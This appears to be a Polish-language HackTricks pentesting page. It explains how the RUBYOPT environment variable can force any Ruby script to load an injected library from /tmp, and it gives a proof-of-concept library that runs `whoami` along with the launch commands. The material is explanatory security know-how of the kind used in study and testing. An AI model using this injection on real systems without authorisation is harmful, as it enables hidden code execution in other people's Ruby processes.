# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Używając tej zmiennej środowiskowej, można **dodać nowe parametry** do **ruby** za każdym razem, gdy jest uruchamiane. Chociaż parametr **`-e`** nie może być użyty do określenia kodu ruby do wykonania, możliwe jest użycie parametrów **`-I`** i **`-r`** do dodania nowego folderu do ścieżki ładowania bibliotek, a następnie **określenie biblioteki do załadowania**.

Utwórz bibliotekę **`inject.rb`** w **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Utwórz gdziekolwiek skrypt ruby, taki jak:
```ruby:hello.rb
puts 'Hello, World!'
```
Następnie załaduj go za pomocą dowolnego skryptu ruby:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Ciekawostka, działa nawet z parametrem **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
